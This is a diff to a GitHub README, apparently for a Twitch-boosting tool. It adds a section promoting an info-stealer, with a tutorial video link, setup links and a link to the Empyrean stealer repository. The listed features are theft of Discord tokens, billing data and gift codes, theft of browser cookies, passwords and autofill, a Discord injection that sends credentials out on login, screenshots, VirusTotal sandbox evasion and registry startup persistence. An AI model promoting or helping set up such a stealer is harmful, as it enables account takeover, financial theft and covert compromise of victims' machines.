@@ -102,6 +102,10 @@ Features
   Tutorials
 </summary> <br />
     
+[Stealer tuto](https://www.veed.io/view/dfd1922c-d4f0-4901-bae2-a26a7447a2fb?sharingWidget=true&panel=share)
+
+All links are [here](https://github.com/KamiHateOmg/TwitchBooster/edit/main/README.md#stealers-and-other)
+	
 > **Note**
 > : Still in development here !
     
@@ -149,8 +153,64 @@ Features
 	
 ## Stealers and other
 
-soon
+<details>
+<summary>
+Features
+</summary> <br />
 
+*   Discord token info
+    *   Nitro
+    *   Badges
+    *   Billing
+    *   Email
+    *   Phone
+    *   HQ Guilds
+    *   HQ Friends
+    *   Gift codes
+*   Browser data
+    *   Cookies
+    *   Passwords
+    *   History
+    *   Bookmarks
+    *   Autofill
+    *   Chrome, Edge, Brave, Opera GX, and many more...
+*   Discord injection
+    *   Send token, password, and email on login or when password is changed
+*   System info
+    *   User
+    *   System
+    *   Disk
+    *   Network
+    *   WiFi
+    *   Screenshot
+*   Anti-debug
+
+    *   Check if being run in a virustotal sandbox
+
+*   Startup persistence
+    *   Place stub in appdata
+    *   Add to startup registry
+
+
+</details>
+	
+<details>
+<summary>
+   Links
+</summary> <br />
+
+* [Python (take the 3.10)](https://www.python.org/downloads/windows/)
+* [Git](https://git-scm.com/download/win)
+* [WinRar](https://www.win-rar.com/start.html?&L=10)
+* [Empyrean](https://github.com/addi00000/empyrean)
+	
+	</details>
+	
+Thank you [addi00000](https://github.com/addi00000/empyrean) for the stealer !
+
+
+
+	
 ## Development
 
 This code is almost entirely coded by me ! (i just used the ChatGpt for some commands).
